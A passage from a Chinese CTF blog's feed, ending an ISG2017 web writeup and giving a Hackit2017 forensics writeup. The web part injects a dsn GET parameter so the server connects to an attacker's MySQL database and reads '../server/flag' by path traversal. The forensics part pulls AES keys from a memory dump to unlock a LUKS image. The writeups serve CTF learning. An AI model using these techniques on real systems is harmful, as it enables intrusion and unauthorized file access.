-<p>然后创建wmwcms用户，@后面有个%，表示可以远程登陆：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; CREATE USER &apos;wmwcms@%&apos; IDENTIFIED BY &quot;%glVYKTkLtQ22&quot;;</div><div class="line">Query OK, 0 rows affected (2.35 sec)</div></pre></td></tr></table></figure></p>
-<p>并为它授权:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; grant all privileges on wmwcms.* to &apos;wmwcms&apos;@&apos;%&apos; identified by &apos;%glVYKTkLtQ22&apos;;</div><div class="line">Query OK, 0 rows affected, 1 warning (0.03 sec)</div></pre></td></tr></table></figure></p>
-<p>这样当我们传入的GET参数为<code>dsn=wmwcms;host=yourvps;port=yourport</code>，后端的sql.php中的pdo会去连接你远程的数据库。之后执行img.php时，从中取出的portrait为我们数据库中的portrait字段，这里为<code>../server/flag</code>。继续执行则到了<code>echo file_get_contents($portrait);</code>，也即执行<code>echo file_get_contents(&quot;../server/flag&quot;);</code></p>
-<p>为什么数据库中要设置成<code>../server/flag</code>，注意app.php是在public文件的，而且默认的<code>$portrait = &quot;img/user.png&quot;</code>，也表明是在public文件夹下。而从源码中可知，flag在server文件夹下，所以需要返回上一层文件夹才能读取。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170831/2.png?raw=true" alt=""></p>
-<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ISG&#123;a107063477b1dd64dabbcaeebf636f7b&#125;</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;ISG2017-wmwcms-writeup&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
-    
-    
-      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
-    
-      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Hackit2017-Cypherpunk’s nightmare-writeup</title>
-    <link href="http://chybeta.github.io/2017/08/30/Hackit2017-Cypherpunk%E2%80%99s-nightmare-writeup/"/>
-    <id>http://chybeta.github.io/2017/08/30/Hackit2017-Cypherpunk’s-nightmare-writeup/</id>
-    <published>2017-08-30T11:32:22.000Z</published>
-    <updated>2017-08-30T12:42:02.448Z</updated>
-    
-    <content type="html"><![CDATA[<p>Hackit2017-Cypherpunk’s nightmare-writeup<br>LUKS aeskeyfind<br><a id="more"></a></p>
-<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Description: Our officers just have made cold boot attack on the suspect&apos;s computer. Your role is to recover the content of this encrypted hard drive.</div><div class="line">Attachment: (none)</div><div class="line">Webpage: https://mega.nz/#!VdRAkaKT!xP7s74jwnlGmR2spg9RNaKFf5GmCGAv-pxW8aPZNkOw</div><div class="line">Hint: (none)</div></pre></td></tr></table></figure>
-<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>题目提供了一个压缩包，解压缩后得到三个文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">encrypted.dd</div><div class="line">memdump.elf.gz  </div><div class="line">__MACOSX</div></pre></td></tr></table></figure></p>
-<p>先看看第一个文件：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170830/4.png?raw=true" alt=""></p>
-<p>可以看到这是一个LUKS加密文件，要解密需要提供密码。结合题目的另外一个文件memdump.elf.gz，我们可以利用工具<code>aeskeyfind</code>来提取藏在内存中的aeskey。</p>
-<p>可以通过下面的命令安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install aeskeyfind</div></pre></td></tr></table></figure></p>
-<p>将memdump.elf.gz压缩包解压后得到data文件，运行aeskeyfind：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">aeskeyfind -v data</div></pre></td></tr></table></figure></p>
-<p>结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line">FOUND POSSIBLE 128-BIT KEY AT BYTE bf16da0</div><div class="line"></div><div class="line">KEY: 9e90126c33c85d9a6913e649301b5dcf</div><div class="line"></div><div class="line">EXTENDED KEY:</div><div class="line">9e90126c33c85d9a6913e649301b5dcf</div><div class="line">30dc98680314c5f26a0723bb5a1c7e74</div><div class="line">ae2f0ad6ad3bcf24c73cec9f9d2092eb</div><div class="line">1d60e388b05b2cac7767c033ea4752d8</div><div class="line">b560820f053baea3725c6e90981b3c48</div><div class="line">0a8bd0490fb07eea7dec107ae5f72c32</div><div class="line">42faf3904d4a8d7a30a69d00d551b132</div><div class="line">d332d0939e785de9aedec0e97b8f71db</div><div class="line">209169b2bee9345b1037f4b26bb88569</div><div class="line">570690cde9efa496f9d850249260d54d</div><div class="line">b105738258ead714a13287303352527d</div><div class="line"></div><div class="line">CONSTRAINTS ON ROWS:</div><div class="line">00000004000000000000000000000000</div><div class="line">000000be000000000000000000000000</div><div class="line">0000005e000000000000000000000000</div><div class="line">00000087000000000000000000000000</div><div class="line">00000046000000000000000000000000</div><div class="line">000000d9000000000000000000000000</div><div class="line">00000003000000000000000000000000</div><div class="line">00000021000000000000000000000000</div><div class="line">0000007f000000000000000000000000</div><div class="line">0000004f000000000000000000000000</div><div class="line"></div><div class="line">FOUND POSSIBLE 128-BIT KEY AT BYTE bf16fa0</div><div class="line"></div><div class="line">KEY: 683c5a4bf8f1cedf5b649c482e48e639</div><div class="line"></div><div class="line">EXTENDED KEY:</div><div class="line">683c5a4bf8f1cedf5b649c482e48e639</div><div class="line">3bb2487ac34386a598271aedb66ffcd4</div><div class="line">9102003452418691ca669c7c7c0960a8</div><div class="line">94d2c224c69344b50cf5d8c970fcb861</div><div class="line">2cbe2d75ea2d69c0e6d8b10996240968</div><div class="line">0abf68e5e0920125064ab02c906eb944</div><div class="line">b5e97385557b72a05331c28cc35f7bc8</div><div class="line">3ac89bab6fb3e90b3c822b87ffdd504f</div><div class="line">7b9b1fbd1428f6b628aadd31d7778d7e</div><div class="line">95c6ecb381ee1a05a944c7347e334a4a</div><div class="line">60103a40e1fe204548bae7713689ad3b</div><div class="line"></div><div class="line">CONSTRAINTS ON ROWS:</div><div class="line">00000031000000000000000000000000</div><div class="line">0000004e000000000000000000000000</div><div class="line">00000010000000000000000000000000</div><div class="line">00000051000000000000000000000000</div><div class="line">00000090000000000000000000000000</div><div class="line">00000060000000000000000000000000</div><div class="line">0000002e000000000000000000000000</div><div class="line">00000016000000000000000000000000</div><div class="line">0000000e000000000000000000000000</div><div class="line">000000f3000000000000000000000000</div><div class="line"></div><div class="line">Keyfind progress: 100%</div></pre></td></tr></table></figure></p>
-<p>重点是得到了两个KEY:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">KEY: 9e90126c33c85d9a6913e649301b5dcf</div><div class="line">KEY: 683c5a4bf8f1cedf5b649c482e48e639</div></pre></td></tr></table></figure></p>
-<p>先拿一个key试试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo &quot;9e90126c33c85d9a6913e649301b5dcf&quot; | xxd -r -p &gt; Safe.key</div></pre></td></tr></table></figure></p>
-<p>尝试解密：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cryptsetup luksOpen --master-key-file Safe.key encrypted.dd safe-home</div></pre></td></tr></table></figure></p>
-<p>但是提示出错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">无法从密钥文件 Safe.key 读取 32 字节。</div></pre></td></tr></table></figure></p>
-<p>我们看看Safe.key是怎样的；<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170830/5.png?raw=true" alt=""></p>
-<p>发现只有十六个字节。</p>
-<p>结合有两个key，我们把两个合起来试试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop/nightmare# echo &quot;9e90126c33c85d9a6913e649301b5dcf683c5a4bf8f1cedf5b649c482e48e639&quot; | xxd -r -p &gt; Safe.key</div><div class="line">root@chybeta:~/Desktop/nightmare# cryptsetup luksOpen --master-key-file Safe.key encrypted.dd safe-home</div><div class="line">卷密钥与卷不匹配。</div><div class="line">root@chybeta:~/Desktop/nightmare# echo &quot;683c5a4bf8f1cedf5b649c482e48e6399e90126c33c85d9a6913e649301b5dcf&quot; | xxd -r -p &gt; Safe.key</div><div class="line">root@chybeta:~/Desktop/nightmare# cryptsetup luksOpen --master-key-file Safe.key encrypted.dd safe-home</div></pre></td></tr></table></figure></p>
-<p>然后在kali系统中可以发现已经可以直接打开卷宗。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170830/6.png?raw=true" alt=""></p>
-<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">h4ck1t&#123;Not_paranoid_enough&#125;</div></pre></td></tr></table></figure></p>
-<p>也可以通过挂载来实现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop/nightmare# ls -l /dev/mapper/</div><div class="line">总用量 0</div><div class="line">crw------- 1 root root 10, 236 8月  25 05:25 control</div><div class="line">lrwxrwxrwx 1 root root       7 8月  25 05:26 safe-home -&gt; ../dm-0</div><div class="line">root@chybeta:~/Desktop/nightmare# mkdir /mnt/safe-home</div><div class="line">root@chybeta:~/Desktop/nightmare# mount /dev/mapper/safe-home /mnt/safe-home/</div><div class="line">root@chybeta:~/Desktop/nightmare# cd /mnt/safe-home/</div><div class="line">root@chybeta:/mnt/safe-home# ls</div><div class="line">flag.txt  Melkor_ELF_fuzzer</div><div class="line">root@chybeta:/mnt/safe-home# cat flag.txt</div><div class="line">h4ck1t&#123;Not_paranoid_enough&#125;</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;Hackit2017-Cypherpunk’s nightmare-writeup&lt;br&gt;LUKS aeskeyfind&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:MISC" scheme="http://chybeta.github.io/categories/writeup-MISC/"/>
-    
-    
-      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
-    
-      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
-    
-      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
-    
-      <category term="Forensic" scheme="http://chybeta.github.io/tags/Forensic/"/>
     
   </entry>
   
